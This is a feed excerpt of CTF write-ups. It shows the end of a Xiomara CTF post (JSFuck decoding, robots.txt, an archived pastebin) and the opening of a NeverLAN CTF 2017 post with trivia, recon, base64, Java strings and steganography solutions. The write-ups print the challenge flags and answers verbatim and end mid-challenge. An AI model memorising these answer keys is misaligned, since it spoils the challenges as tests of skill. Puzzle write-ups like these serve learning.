<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">catch_me</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]]) <span class="comment">/*VERY LONG*/</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Redirect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">               <span class="built_in">window</span>.location=<span class="string">"troll.html"</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            alert(<span class="string">"Warning you are about to be trolled"</span>);</div><div class="line">            setTimeout(<span class="string">'Redirect()'</span>, <span class="number">0</span>);</div></pre></td></tr></table></figure></p>
<p>The <code>catch_me()</code> function looks like some brainfuck-js.</p>
<p>Copy it and paste it in your browser terminal, you will get:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;alert(Xiomara&#123;i_4gr33_Y0U_4r3_a_Flash!&#125;))&quot;</div></pre></td></tr></table></figure></p>
<p>The is a <s>mistake</s> troll, so correct <code>Xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> into <code>xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> (lowercase the first char).</p>
<h2 id="50-no-flags-web-exploitation">50 - No Flags? - Web Exploitation</h2>
<blockquote>
<p>What would you do if we tell you there are no flags for this question? Go on, solve it. That reminds me, Nothing is impossible.</p>
<p><a href="http://139.59.61.220:23467/" target="_blank" rel="external">http://139.59.61.220:23467/</a></p>
</blockquote>
<p>I tried <a href="http://139.59.61.220:23467/robots.txt" target="_blank" rel="external"><code>robots.txt</code></a>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User-agent:*</div><div class="line">Disallow: /flags/</div><div class="line">Disallow: /more_flags/</div><div class="line">Disallow: /more_and_more_flags/</div><div class="line">Disallow: /no_flag/</div></pre></td></tr></table></figure></p>
<p><code>/flags/</code>, <code>/more_flags/</code> and <code>/more_and_more_flags/</code> are obviously trolls.</p>
<p>Let's see <code>/no_flag/</code> source:</p>
<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">function encode(str) &#123;</div><div class="line">str = str.replace(/http:/g, "^^^");</div><div class="line">str = str.replace(/bin/g, "*^$#!")</div><div class="line">str= str.replace(/com/g, "*%=_()");</div><div class="line">str= str.replace(/paste/g, "~~@;;");</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;iframe src="flag.txt" width="2500" height="2255"&gt;</div><div class="line">&lt;/iframe&gt;</div></pre></td></tr></table></figure></p>
<p>It's an iframe of <code>flag.txt</code> which containd some ASCII art, like the three others. But this time there is a script.</p>
<p>The ASCII art display <em>YOU HAVE BEEN HACKED !</em> but on the middle of <em>HACKED</em> we can see <code>&quot;^^^//~~@;;*^$#!.*%=_()/SwzEKazp&quot;</code>.</p>
<p>So let's replace back: <code>http://pastebin.com/SwzEKazp</code>.</p>
<p>So go to pastebin and... <code>This page has been removed!</code>.</p>
<p>So go to the <a href="https://web.archive.org/web/20170225133747/http://pastebin.com/SwzEKazp" target="_blank" rel="external">wayback machine</a>, there is a snapshot dating from 25 Feb. 2017.</p>
<p>We can see an untitled document from <em>XIOMARA_CTF</em> containing: <code>eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==</code>.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==&apos; | base64 -di</div><div class="line">xiomara&#123;1_4m_mr_r0b07&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>NeverLAN CTF 2017 - Write-ups</title>
    <link href="https://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/</id>
    <published>2017-02-26T23:00:00.000Z</published>
    <updated>2017-02-27T22:29:30.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : NeverLAN CTF 2017</li>
<li><strong>Website</strong> : <a href="https://neverlanctf.com/" target="_blank" rel="external">neverlanctf.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/431/" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="50-encoding-apprentice-trivia">50 - Encoding Apprentice - Trivia</h2>
<blockquote>
<p>What common encoding practice’s title contains the square of 8 and occasionally ends with an “=”, or “==”?</p>
</blockquote>
<p>Answer: <em>base64</em></p>
<h2 id="50-shifty-ciphers-trivia">50 - Shifty Ciphers… - Trivia</h2>
<blockquote>
<p>What cipher is the shiftiest of them all? He even has his own salad…</p>
</blockquote>
<p>Answer: <em>caesar</em></p>
<h2 id="50-know-your-extensions-trivia">50 - Know your extensions - Trivia</h2>
<blockquote>
<p>Unix and Linux use this (instead of a file extension) to determine what format a file is.</p>
</blockquote>
<p>Answer: <em>magic numbers</em></p>
<h2 id="50-mmmm-ssl-trivia">50 - Mmmm... SSL - Trivia</h2>
<blockquote>
<p>What is the standard, secure, size of an ssl certificate?</p>
</blockquote>
<p>Answer: <em>2048</em></p>
<h2 id="50-don-t-eat-me-trivia">50 - Don't eat me - Trivia</h2>
<blockquote>
<p>I allow HTTP to act as a stateful protocol instead of the stateless protocol it actually is. Just a small piece of data sent from a website...</p>
</blockquote>
<p>Answer: <em>cookie</em></p>
<h2 id="50-neverlan-recon">50 - NeverLAN - Recon</h2>
<blockquote>
<p>We've been known to leak things on twitter...</p>
</blockquote>
<p>Go to NeverLanCTF twitter: <a href="https://twitter.com/NeverLanCTF" target="_blank" rel="external">https://twitter.com/NeverLanCTF</a></p>
<p>There is <a href="https://twitter.com/NeverLanCTF/status/834992893978804224" target="_blank" rel="external">an interesting twitter status</a>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Rnfl erpba vf rnfl. synt&#123;vas0ezngvba_vf_c0jre_xa0j_l0he_nqirefnel&#125; #CommonCaeserCipher</div></pre></td></tr></table></figure></p>
<p>I tried a rot13 and I got that:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Easy recon is easy. flag&#123;inf0rmation_is_p0wer_kn0w_y0ur_adversary&#125;</div></pre></td></tr></table></figure></p>
<p>Flag is <code>inf0rmation_is_p0wer_kn0w_y0ur_adversary</code>.</p>
<h2 id="100-purvesta-recon">100 - Purvesta - Recon</h2>
<blockquote>
<p>Purvesta also really likes his twitter...</p>
</blockquote>
<ul>
<li>NeverLAN CTFTime page: <a href="https://ctftime.org/team/32118" target="_blank" rel="external">https://ctftime.org/team/32118</a></li>
<li>purvesta CTFtime page: <a href="https://ctftime.org/user/23157" target="_blank" rel="external">https://ctftime.org/user/23157</a></li>
</ul>
<p>purvesta name is: <em>Tanner Purves</em>, his LinkedIn page is not working. So I searched for <em>twitter Tanner Purves</em> and found his twitter page <a href="https://twitter.com/purvesta0704" target="_blank" rel="external">@purvesta0704</a>.</p>
<p>His twitter descripton says:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\\\BSU &apos;20, Co-founder of the NeverLAN CTF/// &#123;ZmxhZ3tXMHdfeTB1X0FyM19HZXR0aW5nX2cwMGRfYXRfVGhpNX0=&#125;</div></pre></td></tr></table></figure></p>
<p>It looks like a base64 string:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;ZmxhZ3tXMHdfeTB1X0FyM19HZXR0aW5nX2cwMGRfYXRfVGhpNX0=&apos; | base64 -d</div><div class="line">flag&#123;W0w_y0u_Ar3_Getting_g00d_at_Thi5&#125;</div></pre></td></tr></table></figure></p>
<h2 id="50-soyoulikemusic-forensics">50 - SoYouLikeMusic - Forensics</h2>
<blockquote>
<p><a href="https://ctf.neverlanctf.com/files/d8dacada92f876cff3f4f5775185240c/SoYouLikeMusic.class" target="_blank" rel="external">SoYouLikeMusic.class</a></p>
</blockquote>
<p>We can use <code>strings</code> on the java class:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">$ strings SoYouLikeMusic.class</div><div class="line">scan</div><div class="line">Ljava/util/Scanner;</div><div class="line">&lt;init&gt;</div><div class="line">Code</div><div class="line">LineNumberTable</div><div class="line">main</div><div class="line">([Ljava/lang/String;)V</div><div class="line">decompilingTheCodeNow</div><div class="line">qOne</div><div class="line">StackMapTable</div><div class="line">qTwo</div><div class="line">qThree</div><div class="line">playGame</div><div class="line">SourceFile</div><div class="line">SoYouLikeMusic.java</div><div class="line">java/util/Scanner</div><div class="line">OAhh welcome... so I hear you like music? What might I call you fellow listener?</div><div class="line">java/lang/StringBuilder</div><div class="line">Well</div><div class="line">4, let&apos;s play a game and see how much you like music.</div><div class="line">UWho was the special artist to dj music for our live streams before the event started?</div><div class="line">    s7a73farm</div><div class="line">Try Again...</div><div class="line">@Now you are on a roll! What is zestyfe&apos;s favorite type of music?</div><div class="line">dubstep</div><div class="line">=Final Question! What is the name of purvesta&apos;s only rap song?</div><div class="line">The_Gettysburg_Address_Rap</div><div class="line">|I will ask you three questions. If you can answer them all right, then I will point you towards your precious flag you seek!</div><div class="line">Want to play? (y/n)</div><div class="line">;Great let&apos;s play! (ctrl-c if you really don&apos;t want to play)</div><div class="line">Congratulations!! You did it!!</div><div class="line">8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=</div><div class="line">SoYouLikeMusic</div><div class="line">java/lang/Object</div><div class="line">java/lang/String</div><div class="line">java/lang/System</div><div class="line">Ljava/io/InputStream;</div><div class="line">(Ljava/io/InputStream;)V</div><div class="line">Ljava/io/PrintStream;</div><div class="line">java/io/PrintStream</div><div class="line">println</div><div class="line">(Ljava/lang/String;)V</div><div class="line">nextLine</div><div class="line">()Ljava/lang/String;</div><div class="line">trim</div><div class="line">append</div><div class="line">-(Ljava/lang/String;)Ljava/lang/StringBuilder;</div><div class="line">toString</div><div class="line">equals</div><div class="line">(Ljava/lang/Object;)Z</div><div class="line">equalsIgnoreCase</div><div class="line">(Ljava/lang/String;)Z</div><div class="line">exit</div><div class="line">(I)V</div></pre></td></tr></table></figure></p>
<p>Focus on:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Congratulations!! You did it!!</div><div class="line">8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=</div></pre></td></tr></table></figure></p>
<p>That looks like base64:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">printf %s &apos;8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=&apos; |base64 -d</div><div class="line">񙱅��Mѥ��&#125;]��ѥ��&#125;=�&#125;���ٕ�ф��&#125;5��х���base64: invalid input</div></pre></td></tr></table></figure></p>
<p>That's wrong let's execute the java class, we know teh answers:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ java -cp . SoYouLikeMusic</div><div class="line">Ahh welcome... so I hear you like music? What might I call you fellow listener?</div><div class="line">alex</div><div class="line"></div><div class="line">Well alex, let&apos;s play a game and see how much you like music.</div><div class="line">I will ask you three questions. If you can answer them all right, then I will point you towards your precious flag you seek!</div><div class="line">Want to play? (y/n)</div><div class="line">y</div><div class="line"></div><div class="line">Great let&apos;s play! (ctrl-c if you really don&apos;t want to play)</div><div class="line"></div><div class="line">Who was the special artist to dj music for our live streams before the event started?</div><div class="line">s7a73farm</div><div class="line"></div><div class="line">Now you are on a roll! What is zestyfe&apos;s favorite type of music?</div><div class="line">dubstep</div><div class="line"></div><div class="line">Final Question! What is the name of purvesta&apos;s only rap song?</div><div class="line">The_Gettysburg_Address_Rap</div><div class="line"></div><div class="line">Congratulations!! You did it!!</div><div class="line">ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=</div></pre></td></tr></table></figure></p>
<p>There was only a <code>8</code> before our base64 string:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=&apos; | base64 -di</div><div class="line">flag&#123;Still_Waiting_On_purvesta&apos;s_Mixtape&#125;</div></pre></td></tr></table></figure></p>
<p><strong>Note</strong>: This is not forensics.</p>
<h2 id="300-just-a-selfie-forensics">300 - just-a-selfie - Forensics</h2>
<blockquote>
<p>You've been put in charge of a very secret project. There's talk that some of your data has leaked out. Your security analyst has flagged this email as &quot;out of place&quot;. Has your company been breached?</p>
<p>Hmm.. Binwalk.</p>
<p>Now that's a useful tool!</p>
</blockquote>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file email.txt</div><div class="line">email.txt: SMTP mail, ASCII text</div></pre></td></tr></table></figure></p>
<p>This is a mail with a attached image.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">--Apple-Mail=_9C94B8C8-A2CF-4892-8E1B-A89A4C3EAE03</div><div class="line">Content-Transfer-Encoding: base64</div><div class="line">Content-Disposition: inline;</div><div class="line">    filename=selfie.jpg</div><div class="line">Content-Type: image/jpeg;</div><div class="line">    x-unix-mode=0644;</div><div class="line">    name=&quot;selfie.jpg&quot;</div><div class="line">Content-Id: &lt;456C033A-8B84-4975-B1DC-3E5820C8993A@death.star&gt;</div></pre></td></tr></table></figure></p>
<p>The image is base64 encoded, and split between line 92 and line 12617.</p>
<p>Of course, <code>binwalk</code> is useless here:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">1369          0x559           HTML document header</div><div class="line">4003          0xFA3           HTML document footer</div><div class="line">9689          0x25D9          Unix path: /WqckbqxDJsHoQRUjuIXZONp/Kk81v7p/KjzN4BFG73qguf/0Pu9</div><div class="line">11085         0x2B4D          Unix path: /4RD4Z6ZCUZZplNxIrjBy/I/QgV9N/DfxvL4aeO+t0</div><div class="line">13229         0x33AD          Unix path: /ENn/Y/huxtvl8wx5Yrjljz/XFcVZQtPdqFRpH3DhFzntj8eK7L4h3</div><div class="line">13284         0x33E4          Unix path: /nakVUgImCE9BjOK2f2dPAx8c/F/w/p+zfD9pW4kA4+SP5mz7dK8OeIjhsJKtN7Js/Sc0pxnmnsl</div><div class="line">14560         0x38E0          Unix path: /wCEI0L/AJ8I/wDvqtxbcOoY/KTz6Uv2</div><div class="line">15287         0x3BB7          Unix path: /qK6f4i/C/VfHGu/wBs+MdbXXmhwEuZIRFIUAGAQuOn1P0rxLRVlc+hdp6rRI8RvvDfhTxRpk8h</div><div class="line">22696         0x58A8          Unix path: /8E/Ke8hMUKjeWAOBkde/9c/jVZIhnPfvmr2or8qZwpPJHFVQm7ngjsDWt</div><div class="line">23242         0x5ACA          Unix path: /jivyX2F9h6LjJ/P/J/GvqMszD+0Kcm1ZrcqbhUh7WGielgaMcY</div><div class="line">25527         0x63B7          Unix path: /VX4Z/sceA/B/hq2iksI7rUFjAedu/Gf5ivMlZaHq+1jSXNI/P8A+FHxw1DwhrDWGlBbnT3bZLay</div><div class="line">26919         0x6927          Unix path: /g9Ya7q2iG9/4SKO4Xz1zss1b/AFYcehBbrXxjjLmaPufiimmec/DD4VaN4j1K8uIbWym1</div><div class="line">29935         0x74EF          Unix path: /AI/pTd3IVudkZwoPsWP/AI7X2XdzLDG7M20AE5r8q/2lvHLfED4yeIL/</div><div class="line">33346         0x8242          Unix path: /8d2V8h6gAHRADuC54969P/aJ8X/8ACc/H</div><div class="line">35802         0x8BDA          Unix path: /KvZNS/bO8a61EBdzJLFghkZuAOR1/Ovn74k/FC58Q</div><div class="line">36928         0x9040          Unix path: /klCp/1gIwfY1z2sSrIxWX5to/vYrQ4iLU/FsiXLyLB5MucoAPlj/xrKufEV1e4S4K/NyGB</div><div class="line">42880         0xA780          Unix path: /a/E/hDRQwxbWk1y/PQu4Uf+i/1r4a1Ihrjysj93x07100aM</div><div class="line">43257         0xA8F9          Unix path: /Z8yuKjGpSany/ebZ8P6bqWDG/2Vm/ij5H5Gsq/8K3FmC0bxzpuyD0Ki</div><div class="line">49189         0xC025          Unix path: /rtr4UWLzdoB3Z/Kvfv2z/GR8UfGaewhfdaaLAtoo3Y/eHDuf1A/C</div><div class="line">50244         0xC444          Unix path: /ljkcgHrV/RNXOm6pFLjMT/LKnHzr3WgpMr5AA2/xVteG5f3k0bN6HH+fwqprmnHTbwmI7rOb95B</div><div class="line">53176         0xCFB8          Unix path: /8E7tBW30/xJrEsflyTMlvE5/iGSWA/Ja+HzKq6OAqS6yP0PMKqipQh9iKXzPt7Tvml5rY</div><div class="line">55034         0xD6FA          Unix path: /wBivxnBfOmn6hp91bfwySPsY/UGqX/DGPxA/wCfjTP+/wAK+8fIP90n8KPI</div><div class="line">60216         0xEB38          Unix path: /TRd66LiUARWaeeWI6sDhV/U/lT/F1+19qUuO</div><div class="line">65339         0xFF3B          Unix path: /AMBrzL/hb3ib/oI3X5mvAdFXPSWHbSZ//9P4g8A+Ab3VNM1HxQztJpem3kFoSSMvNKrlVwOw</div><div class="line">67005         0x105BD         StuffIt Deluxe Segment (data): fpW74o1EL5VrGoBI3PhRkc</div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>So let's extract the base64 string, join it, decode it and save the ouput in a file (with a ruby script of course).</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">"base64"</span></div><div class="line"></div><div class="line">line_no = <span class="number">1</span></div><div class="line">selfie_b64 = <span class="string">""</span></div><div class="line"></div><div class="line">File.open(<span class="string">"email.txt"</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|file|</span></div><div class="line">    file.each <span class="keyword">do</span> <span class="params">|line|</span></div><div class="line">        <span class="keyword">if</span> line_no &gt;= <span class="number">92</span> &amp;&amp; line_no &lt;= <span class="number">12617</span></div><div class="line">            selfie_b64 += line.chomp</div><div class="line">        <span class="keyword">end</span></div><div class="line">        line_no += <span class="number">1</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">selfie_plain = Base64.decode64(selfie_b64)</div><div class="line"></div><div class="line">File.open(<span class="string">"selfie.jpg"</span>, <span class="string">'w'</span>) <span class="keyword">do</span> <span class="params">|file|</span></div><div class="line">    file.write(selfie_plain)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>I obtained this picture:
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file selfie.jpg</div><div class="line">selfie.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 820x618, frames 3</div></pre></td></tr></table></figure></p>
<p><img src="http://i.imgur.com/tcjBM2a.jpg" alt=""></p>
<p>This image seems to hide something else (trailing data):</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ binwalk selfie.jpg</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">128969        0x1F7C9         Zip archive data, at least v2.0 to extract, name: Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg</div><div class="line">712883        0xAE0B3         Zip archive data, at least v1.0 to extract, name: __MACOSX/</div><div class="line">712938        0xAE0EA         Zip archive data, at least v2.0 to extract, name: __MACOSX/._Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg</div><div class="line">713908        0xAE4B4         End of Zip archive</div></pre></td></tr></table></figure></p>
<p>Then I extracted it with <code>foremost</code> and unzip the archive:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ unzip 00000251.zip</div><div class="line">Archive:  00000251.zip</div><div class="line">  inflating: Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg  </div><div class="line">   creating: __MACOSX/</div><div class="line">  inflating: __MACOSX/._Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg</div></pre></td></tr></table></figure></p>
<p>Finally, I get this Death Star Elevation Plan:</p>
<p><img src="http://i.imgur.com/YZ84sSG.jpg" alt=""></p>
<p>Flag is <code>rebellions_are_built_on_hope</code>.</p>
<p><strong>Note</strong>: This is steganography, not forensics.</p>
<h2 id="100-thehistoryofcryptography-cryptography">100 - TheHistoryOfCryptography - Cryptography</h2>
<p><code>The_History_of_Cryptography.zip</code> contains two files: <code>0.txt</code> and <code>1.zip</code> :</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat 0.txt</div><div class="line">This Shifty Cipher is one of the simplest, and most well know ciphers.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>caesar</em></p>
<p>The zip is password protected and the password is the answer of <code>0.txt</code>.</p>
<p><code>1.zip</code> contains 2 files: <code>1.txt</code> and <code>2.zip</code>, and so on.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 1.txt</div><div class="line">This Cipher is is named after the person who made it famous, not but the man who first created it.</div><div class="line"></div><div class="line">Password:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>vigenere</em></p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 2.txt</div><div class="line">This transposition cipher was used by the warriors in the famous movie &quot;the 300&quot;</div><div class="line"></div><div class="line">PassWord:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>scytale</em></p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 3.txt</div><div class="line">The first recorded use of this cipher was used to hide a book of magic.</div><div class="line"></div><div class="line">Password:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>steganography</em> (<a href="https://en.wikipedia.org/wiki/Steganography" target="_blank" rel="external">details</a>)</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat 4.txt</div><div class="line">This world famous cipher was invented by Arthur Scherbius</div><div class="line"></div><div class="line">Password:&quot;The name of cipher in the riddle&quot; with out the quotes.</div></pre></td></tr></table></figure></p>
<p>Answer: <em>enigma machine</em> (<a href="https://en.wikipedia.org/wiki/Arthur_Scherbius" target="_blank" rel="external">details</a>)</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ cat 5.txt</div><div class="line">Which one is you&apos;re favorite? I love them all because...</div><div class="line">flag&#123;THEHISTORYOFCRYPTOGRAPHYISAW3S0M3&#125;</div></pre></td></tr></table></figure></p>
<p>Flag is <code>THEHISTORYOFCRYPTOGRAPHYISAW3S0M3</code>.</p>
<p><strong>Note</strong>: this challenge was a quizz, not a cryptography challenge. It should have been in Trivia, Misc, Quizz or Other.</p>
<h2 id="100-a-slight-cut-web">100 - A Slight Cut - Web</h2>
<blockquote>
<p><a href="http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/" target="_blank" rel="external">http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/</a></p>
</blockquote>
<p>Source:</p>
